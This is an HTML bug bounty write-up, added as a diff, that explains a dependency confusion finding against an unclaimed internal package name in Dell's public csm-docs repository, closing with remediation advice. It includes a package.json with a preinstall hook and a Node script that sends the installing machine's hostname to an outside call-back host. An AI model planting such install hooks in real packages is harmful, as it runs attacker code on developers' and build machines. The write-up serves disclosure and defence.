@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>How I earned a $750 bounty for a dependency confusion attack on Dell — M1S0</title>
+<meta name="description" content="A package name Dell forgot to claim was all it took. The whole story, in plain English, from the file I found to the bounty that landed.">
+<meta property="og:title" content="How I earned a $750 bounty for a dependency confusion attack on Dell — M1S0">
+<meta property="og:description" content="A package name Dell forgot to claim was all it took. The whole story, in plain English, from the file I found to the bounty that landed.">
+<meta property="og:type" content="article">
+<link rel="icon" href="/favicon.ico" sizes="any">
+<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicon-32.png">
+<link rel="apple-touch-icon" href="/assets/img/favicon-180.png">
+<link rel="alternate" type="application/rss+xml" title="M1S0 — Writeups" href="/feed.xml">
+<meta name="theme-color" content="#0f1115">
+<meta property="og:image" content="https://m1s0-0.github.io/assets/img/og/dell-dependency-confusion.png">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="630">
+<meta property="og:site_name" content="M1S0">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://m1s0-0.github.io/assets/img/og/dell-dependency-confusion.png">
+<link rel="canonical" href="https://m1s0-0.github.io/writeups/posts/dell-dependency-confusion.html">
+<meta property="og:url" content="https://m1s0-0.github.io/writeups/posts/dell-dependency-confusion.html">
+
+<link rel="stylesheet" href="/assets/css/site.css">
+</head>
+<body>
+
+<div class="progress"><i></i></div>
+
+<nav class="nav">
+  <div class="nav-inner">
+    <a class="brand" href="/">M1S0</a>
+    <div class="nav-right">
+      <a href="/">Portfolio</a>
+      <a href="/writeups/">All writeups</a>
+    </div>
+  </div>
+</nav>
+
+<nav class="toc" id="toc"></nav>
+
+<article class="article">
+
+  <a class="back" href="/writeups/">&larr; Writeups</a>
+
+  <div id="series"></div>
+
+  <h1 class="title">How I earned a $750 bounty for a dependency confusion attack on Dell</h1>
+  <p class="subtitle">A package name Dell forgot to claim was all it took. Here is the whole story, in plain English, from the file I found to the bounty that landed.</p>
+
+  <div class="author">
+    <span class="avatar" id="byline-avatar"></span>
+    <div>
+      <div class="author-name" id="byline-name"></div>
+    </div>
+  </div>
+
+  <div class="body">
+
+    <p>
+      Some of the best bugs are not clever. They are just something everyone forgot to
+      check. This one was a single package name, sitting in the open in one of Dell's
+      public repositories on GitHub. Nobody had claimed it. So I claimed it, showed it
+      could run code, and reported it. Dell fixed it, and it paid a <strong>$750</strong>
+      bounty.
+    </p>
+
+    <p>
+      Here is how it happened, start to finish, with nothing assumed.
+    </p>
+
+    <figure>
+      <img src="/assets/img/writeups/dell-dependency-confusion/00-bounty-proof.png"
+           alt="The Bugcrowd submission for the Dell program, marked Resolved and fixed, with a $750 reward, titled Dependency Confusion Attack to RCE">
+      <figcaption>The report on Dell's Bugcrowd program: <strong>resolved and fixed</strong>, rewarded <strong>$750</strong>, filed as <em>Dependency Confusion Attack to RCE</em>.</figcaption>
+    </figure>
+
+    <h2>What dependency confusion means</h2>
+
+    <p>
+      Modern software is built out of small building blocks called packages. You do not
+      write everything yourself. You pull in packages other people wrote, and your app
+      stacks on top of them.
+    </p>
+
+    <p>
+      Some packages are <strong>public</strong>: anyone can download them from a
+      public store like npm. Some are <strong>private</strong>: only the company
+      has them, kept on their own internal store. When the app is built, a tool reads a
+      list of package names and goes and fetches each one.
+    </p>
+
+    <p>
+      Here is the catch. That tool fetches by <em>name</em>. If a private package name is
+      not also locked down on the public store, the tool can be tricked into downloading
+      a <em>public</em> package that happens to have the same name. And if an attacker is
+      the one who put that public package there, the attacker's code is what gets pulled
+      in. That is dependency confusion: the build gets confused about which package a name
+      really points to.
+    </p>
+
+    <h2>How I found it</h2>
+
+    <p>
+      I was reading through <code>dell/csm-docs</code>, one of Dell's public
+      documentation repositories. Documentation repos are meant to be public, so they
+      often do not get guarded as tightly as the real product. That makes them a good
+      place to look.
+    </p>
+
+    <p>
+      Inside, under the installation wizard, was an ordinary build file called
+      <code>package.json</code>. One line caught my eye: the name.
+    </p>
+
+    <pre data-file="content/v3/deployment/csminstallationwizard/src/package.json" data-lang="json"><code>{
+    "name": "csm-installation-wizard",
+    "version": "1.0.0",
+    "description": "",
+    "scripts": {
+        "test": "jest --ci",
+        "coverage": "jest --coverage"
+    }
+}
+</code></pre>
+
+    <figure>
+      <img src="/assets/img/writeups/dell-dependency-confusion/01-github-packagejson.png"
+           alt="The package.json file open in the dell/csm-docs repository on GitHub, showing the name csm-installation-wizard">
+      <figcaption>The file in the public repo. The name is <code>csm-installation-wizard</code>, it reads like something internal to Dell.</figcaption>
+    </figure>
+
+    <p>
+      <code>csm-installation-wizard</code> is not a name you would expect to see on the
+      public npm store. It looks like an internal Dell package. So I asked the one
+      question the whole bug rests on: has anyone actually claimed this name in public,
+      or is the build trusting a name that is still up for grabs?
+    </p>
+
+    <h2>Checking if the name was free</h2>
+
+    <p>
+      I checked two ways, and both gave the same answer. First, the registry itself.
+    </p>
+
+    <pre data-file="terminal" data-lang="bash"><code>curl -s https://registry.npmjs.org/csm-installation-wizard
+# {"error":"Not found"}
+</code></pre>
+
+    <p>
+      Then the search page that any developer would use.
+    </p>
+
+    <figure>
+      <img src="/assets/img/writeups/dell-dependency-confusion/02-npm-search.png"
+           alt="The npm search for csm-installation-wizard returning 0 packages found">
+      <figcaption>The public search says the same thing: <strong>0 packages found</strong>. The name belonged to nobody.</figcaption>
+    </figure>
+
+    <div class="callout callout-danger">
+      <strong>This is the whole bug</strong>
+      <p>
+        A public file names a package that does not exist on the public store. That name
+        is free. Whoever registers it first owns what gets installed everywhere that
+        fetches this dependency from the public store, and installing a package can
+        run code.
+      </p>
+    </div>
+
+    <h2>Proving it, without going too far</h2>
+
+    <p>
+      Finding an open door is not the same as showing it opens. I had to prove the name
+      really pointed to my code and that my code would run, and prove it in a way
+      that touched nothing I was not allowed to touch.
+    </p>
+
+    <p>
+      So I published a harmless package under that same name. I pointed its install hook
+      at a small script, so the moment anything installed the package, the script would
+      run on its own.
+    </p>
+
+    <pre data-file="package.json" data-lang="json"><code>{
+    "name": "csm-installation-wizard",
+    "version": "1.0.1",
+    "scripts": {
+        "preinstall": "node index.js"
+    }
+}
+</code></pre>
+
+    <p>
+      The script does nothing but phone home. It reads the machine's own name and sends it
+      to a <a href="https://portswigger.net/burp/documentation/collaborator" rel="noopener">Burp
+      Collaborator</a> server, a tool that simply catches these call-backs so you can see
+      them arrive. Nothing sensitive is read, and nothing is changed.
+    </p>
+
+    <pre data-file="index.js" data-lang="javascript"><code>const https = require('https');
+const os = require('os');
+const hostname = os.hostname();
+
+const data = new TextEncoder().encode(
+  JSON.stringify({ payload: hostname, project_id: process.argv[2] })
+);
+
+const options = {
+  // a unique Collaborator address, so any call-back is unmistakably mine
+  hostname: process.argv[2] + '.' + hostname + '.YOUR-ID.oastify.com',
+  port: 443,
+  method: 'POST',
+  headers: { 'Content-Type': 'application/json', 'Content-Length': data.length }
+};
+
+const req = https.request(options, res =&gt; {
+  console.log(`STATUS: ${res.statusCode}`);
+});
+req.on('error', e =&gt; console.error(e.message));
+req.write(data);
+req.end();
+</code></pre>
+
+    <p>
+      Then I installed the package on a clean test machine, exactly the way a build would.
+      The install ran the script, and the call-back arrived. That call-back is the proof:
+      the name pointed to my package, and my code ran on a machine that was not mine.
+    </p>
+
+    <figure>
+      <video controls preload="none" playsinline
+             poster="/assets/img/writeups/dell-dependency-confusion/demo-poster.jpg">
+        <source src="/assets/img/writeups/dell-dependency-confusion/demo.mp4" type="video/mp4">
+        Your browser cannot play this video. It shows <code>npm i csm-installation-wizard</code>
+        installing the registered package on a test machine.
+      </video>
+      <figcaption>The proof, running: <code>npm i csm-installation-wizard</code> pulls the package I registered and installs it, which is the same install any build would run when it resolved this dependency from the public store.</figcaption>
+    </figure>
+
+    <p>
+      This is why the report is filed as reaching <strong>RCE</strong>, short for remote
+      code execution. Installing a package is not just a download, it can run scripts.
+      Owning the name means running code on whoever installs it.
+    </p>
+
+    <div class="callout callout-warn">
+      <strong>Where I stopped</strong>
+      <p>
+        One call-back carrying just the machine name is enough to prove the point. Going
+        further, reading files, hunting for real secrets, would cross the
+        line the program draws, and the report did not need it. Show the door opens. You
+        do not have to walk through it.
+      </p>
+    </div>
+
+    <h2>Why a docs repo actually matters</h2>
+
+    <p>
+      It is easy to shrug at a documentation repo. The reason it matters is <em>where</em>
+      a package like this gets installed: on build servers and on developers' own laptops.
+      Those machines sit close to source code, to passwords and keys, and to the internal
+      network. Code that runs there is a real foothold, not a curiosity.
+    </p>
+
+    <h2>How to fix it</h2>
+
+    <p>
+      Dependency confusion is a naming problem, so the real fixes are about owning the
+      name, not about filtering traffic.
+    </p>
+
+    <ul>
+      <li><strong>Use a scope.</strong> A name like <code>@dell/installation-wizard</code> ties the package to Dell's own store, so a plain public name can never stand in for it.</li>
+      <li><strong>Claim the name first.</strong> For any internal name that shows up in public code, publish a placeholder so the name is already taken.</li>
+      <li><strong>Pin the source.</strong> Tell the build tool to fetch internal packages only from the internal store, so a public copy is never even looked at.</li>
+      <li><strong>Watch what public repos give away.</strong> Even a docs repo handed out a real internal package name. Treat every public file as a hint about your private packages.</li>
+    </ul>
+
+    <h2>How it ended</h2>
+
+    <p>
+      I wrote it up and sent it in. Dell confirmed it, fixed it, and marked the report
+      resolved. The bounty was <strong>$750</strong>. No clever exploit chain, no rare
+      trick, just a package name that nobody remembered to claim.
+    </p>
+
+    <div class="takeaways">
+      <h3>Key takeaways</h3>
+      <ul>
+        <li>A public repo quietly reveals the names of private packages, and a name is all this attack needs.</li>
+        <li>The entire bug is one question: is the internal package name also claimed on the public store?</li>
+        <li>One harmless call-back proves the name resolves to your code and that the code runs, without touching anything sensitive.</li>
+        <li>Fix it by owning the name: scopes, placeholder packages, and pinning the internal store.</li>
+      </ul>
+    </div>
+
+    <div class="refs">
+      <h3>References</h3>
+      <ol>
+        <li><a href="https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610" rel="noopener">Alex Birsan: Dependency Confusion, the original research</a></li>
+        <li><a href="https://docs.npmjs.com/cli/v10/using-npm/scope" rel="noopener">npm docs: scoped packages</a></li>
+        <li><a href="https://portswigger.net/burp/documentation/collaborator" rel="noopener">PortSwigger: Burp Collaborator</a></li>
+      </ol>
+    </div>
+
+  </div>
+
+</article>
+
+<div class="afoot reveal">
+  <div class="afoot-tags">
+    <span class="chip">Dependency Confusion</span>
+    <span class="chip">Supply Chain</span>
+    <span class="chip">RCE</span>
+    <span class="chip">npm</span>
+  </div>
+  <div class="share">
+    <span>Share</span>
+    <a class="sbtn" id="share-x">on X</a>
+    <button class="sbtn" id="share-copy" type="button">Copy link</button>
+  </div>
+
+  <div id="authorbox"></div>
+
+  <div class="prevnext" id="prevnext"></div>
+
+  <div class="more">
+    <h3>More writeups</h3>
+    <div id="more"></div>
+  </div>
+</div>
+
+<button class="totop" id="totop" type="button" aria-label="Back to top">↑</button>
+
+<script src="/assets/js/data/writeups.js"></script>
+<script src="/assets/js/site.js"></script>
+<script>
+  initArticle({
+    slug:  "dell-dependency-confusion",
+    title: "How I earned a $750 bounty for a dependency confusion attack on Dell"
+  });
+</script>
+
+</body>
+</html>
